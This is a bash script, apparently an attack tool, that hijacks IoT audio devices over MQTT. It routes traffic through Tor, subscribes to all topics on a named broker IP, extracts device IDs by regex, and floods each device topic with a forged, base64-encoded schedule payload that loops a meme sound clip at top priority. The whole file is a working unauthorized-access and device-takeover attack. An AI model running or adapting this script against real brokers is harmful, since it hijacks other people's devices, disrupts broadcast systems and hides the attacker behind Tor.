#!/bin/bash
# HIJACK_ALL_VOV_FIXED.sh - Peppe Brescia Poeta LOOP (NO -C)

PEPPER_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
PEPPER_PAYLOAD='[
  {
    "id":51886,
    "show_id":51886,
    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZSBicmVzY2lhIHBvZXRhIEhJSkFDSy1WT1YzIiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoyMTQ3NDgzNjMyLCJ0cyI6WzE3MjgwMF0sImRzIjpbMTcyODAsMTcyODBdLCJjcmVhdGVkIjoxNzY3NjM1MDAwLCJzdGFydCI6MTc2NzYzMjQwMCwiZXhwaXJlZCI6MTc2OTg3ODc5OSwiZmlsZXMiOlt7ImlkIjo1MTg4NiwiaW5kZXgiOjAsInR5cGUiOjEsInNpemUiOjEyMzQ1Niwic3MiOjEyMzQ1NiwidXJsIjoiaHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3BlcHBlLWJyZXNjaWEtcG9ldGEubXAzIn1dfQ==",
    "action":1,
    "description":"Peppe Brescia Poeta LOOP",
    "version":1,
    "created_at":"2026-01-06T01:00:00.000000000+07:00"
  }
]'

echo "=== PEppe Brescia Poeta VOV HIJACK LIVE START ==="
echo "URL: $PEPPER_URL"
echo "LOOP: YES"

while read -r line; do
  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
    TOPIC="${BASH_REMATCH[1]}:d:16"
    echo "ID=$TOPIC HIJACKED → Peppe Brescia Poeta"
    
    for i in {1..5}; do
      torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" &
    done
  fi
done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
